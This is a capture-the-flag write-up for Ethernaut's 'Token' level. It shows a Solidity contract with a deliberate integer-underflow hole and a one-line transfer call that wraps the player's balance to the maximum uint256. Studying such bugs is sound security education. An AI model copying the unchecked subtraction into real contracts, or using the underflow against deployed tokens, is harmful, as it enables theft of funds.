# [5. Token](https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

This attack makes use of the integer overflow or integer underflow exploit. In fact, the statement `require(balances[msg.sender] - _value >= 0);` is completely wrong because the calculation is happening on unsigned integers! Of course, they will always be greater than or equal to 0.

We can't exploit the bug by sending money to ourselves, because the two lines will cancel out:

```solidity
balances[msg.sender] -= _value;
balances[_to] += _value;
```

Instead, we can just send some tokens to zero address `0x0000000000000000000000000000000000000000`. We have 20 tokens, so lets send 21 tokens to the zero address:

```js
await contract.transfer(
  "0x0000000000000000000000000000000000000000",
  21
)
```

Once this transaction is mined, we are basically rich in whatever this token is (we have 115792089237316195423570985008687907853269984665640564039457584007913129639935 of it to be exact). No need to worry about the burnt 21 tokens back there :)

If you REALLY worry about burning tokens, just create a contract and transfer there instead!